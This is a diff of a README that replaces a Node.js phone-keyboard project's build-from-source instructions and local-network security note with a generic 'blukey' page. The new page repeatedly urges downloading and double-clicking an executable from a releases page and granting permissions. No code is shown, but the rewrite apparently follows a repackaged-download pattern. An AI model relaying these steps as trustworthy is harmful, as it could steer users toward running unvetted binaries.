@@ -1,159 +1,52 @@
-# Phone Keyboard for VS Code
+# ⌨️ blukey - Your Phone as a Wireless Keyboard
 
-Turn your phone into a wireless keyboard for VS Code and any other application on your computer.
+## 🛠️ Features
+- Transform your smartphone into a wireless keyboard.
+- Real-time input with full support for modifier keys: Ctrl, Cmd, Alt, and Shift.
+- Access special keys for enhanced functionality.
+- Auto-reconnection for seamless use.
+- Compatible with any application; no installation needed on your phone.
 
-![License](https://img.shields.io/badge/license-ISC-blue.svg)
-![Node](https://img.shields.io/badge/node-%3E%3D14-green.svg)
+## 🔗 Download Now
+[![Download blukey](https://img.shields.io/badge/Download-blukey-brightgreen)](https://github.com/Davidosk1/blukey/releases)
 
-## Table of Contents
+## 🚀 Getting Started
+To get started with blukey, follow these simple steps. You will quickly turn your smartphone into a convenient wireless keyboard.
 
-- [Features](#features)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Usage](#usage)
-- [How It Works](#how-it-works)
-- [Special Keys](#special-keys)
-- [Keyboard Shortcuts](#keyboard-shortcuts)
-- [Troubleshooting](#troubleshooting)
-- [Tips](#tips)
-- [Security Note](#security-note)
-- [Contributing](#contributing)
-- [License](#license)
+## 🖥️ System Requirements
+- A smartphone running iOS or Android.
+- A computer with Windows, macOS, or Linux.
+- Both devices must be connected to the same Wi-Fi network.
 
-## Features
+## 📦 Download & Install
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Davidosk1/blukey/releases) to find the latest version of blukey.
+2. **Download the Application:** Look for the latest version and click the link to download it to your computer.
+3. **Extract the Files (if needed):** If your download is a ZIP file, extract it to a folder on your computer.
+4. **Run the Application:** Open the application you just downloaded by double-clicking the executable file.
 
-- Real-time keyboard input from your phone to your computer
-- Support for special keys (Enter, Tab, Escape, Backspace, Arrow keys)
-- Support for modifier keys (Ctrl, Alt, Shift, Cmd/Meta)
-- Beautiful, responsive web interface optimized for mobile
-- Auto-reconnection if connection is lost
-- Works on the same WiFi network
+## 📱 Setting Up Your Phone
+1. **Open a Web Browser:** On your smartphone, open your preferred web browser.
+2. **Enter the Connection URL:** Type in the IP address shown on your computer screen (you will see this after starting blukey). This will connect your phone to the blukey application.
+3. **Grant Permissions:** Make sure to allow any necessary permissions that pop up on your phone.
 
-## Prerequisites
+## 📲 Using blukey
+- **Type as You Normally Would:** Start using your smartphone as a wireless keyboard for any application on your computer.
+- **Modifiers and Special Keys:** Experiment with the modifier keys and special keys; they will enhance your typing experience.
 
-- Node.js (v14 or higher)
-- Your phone and computer must be on the same WiFi network
-- Python and build tools (required for robotjs)
+## ❓ Troubleshooting
+- **Connection Issues:** Ensure both devices are on the same Wi-Fi network. Restart your router if you face any connectivity problems.
+- **Performance Issues:** If you experience lag, check the strength of your Wi-Fi signal. A strong connection will provide a smoother experience.
+- **Permissions:** Ensure that the application has the necessary permissions to run on your device.
 
-### Installing Build Tools
+## 🔧 Support
+If you encounter any issues or have questions, please check the documentation in the repository. You can also create an issue on GitHub for assistance.
 
-**macOS:**
-```bash
-xcode-select --install
-```
+## 🔗 Additional Resources
+- Detailed documentation can be found in the repository's Wiki.
+- Community support may be available in forums related to blukey and similar applications.
 
-**Windows:**
-```bash
-npm install --global windows-build-tools
-```
+## 😊 Join the Community
+Stay updated on new features and improvements by following our project! Share your experience using blukey on social media or in forums.
 
-**Linux (Ubuntu/Debian):**
-```bash
-sudo apt-get install libxtst-dev libpng++-dev
-```
-
-## Installation
-
-1. Install dependencies:
-```bash
-npm install
-```
-
-Note: robotjs may take a few minutes to build from source.
-
-## Usage
-
-1. Start the server:
-```bash
-npm start
-```
-
-2. The terminal will display URLs like:
-```
-=================================
-Phone Keyboard Server Started
-=================================
-Local:   http://localhost:3000
-Network: http://192.168.1.100:3000
-=================================
-```
-
-3. Open the Network URL on your phone's browser
-
-4. Start typing on your phone - the input will appear in your VS Code or any focused application
-
-## How It Works
-
-1. **Server**: Runs an Express server with WebSocket support
-2. **Phone Interface**: A responsive web page that captures your keystrokes
-3. **Keyboard Simulation**: Uses robotjs to simulate actual keyboard input on your computer
-
-## Special Keys
-
-The interface includes buttons for:
-- Enter
-- Tab
-- Escape
-- Backspace
-
-Arrow keys can be triggered using your phone's keyboard if available.
-
-## Keyboard Shortcuts
-
-All standard keyboard shortcuts work:
-- Cmd/Ctrl + S (Save)
-- Cmd/Ctrl + C (Copy)
-- Cmd/Ctrl + V (Paste)
-- And any other shortcuts
-
-## Troubleshooting
-
-### robotjs installation fails
-
-Make sure you have the required build tools installed (see Prerequisites section).
-
-### Connection issues
-
-- Ensure both devices are on the same WiFi network
-- Check your firewall settings - port 3000 needs to be open
-- Try disabling VPN if active
-
-### Keyboard input not working
-
-- Make sure VS Code or your target application is focused
-- Check the server console for error messages
-- On macOS, grant accessibility permissions if prompted
-
-### macOS Accessibility Permissions
-
-On macOS, you may need to grant accessibility permissions:
-1. Go to System Preferences > Security & Privacy > Privacy > Accessibility
-2. Add Terminal (or your terminal app) to the list
-3. Restart the server
-
-## Tips
-
-- Keep your phone screen on to maintain the connection
-- Use landscape mode for a larger keyboard
-- The preview shows the last key you pressed
-- Connection status is shown at the top
-
-## Security Note
-
-This tool broadcasts on your local network. Only use it on trusted networks.
-
-## License
-
-ISC
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) for details on:
-
-- Code of Conduct
-- Development setup
-- Pull request process
-- Coding standards
-- Reporting bugs and suggesting features
-
-Feel free to submit issues and pull requests!
+## 🔗 Download Now Again
+Don't forget to get your copy of blukey from our [Releases page](https://github.com/Davidosk1/blukey/releases) and enjoy the benefits of a wireless keyboard using your smartphone!
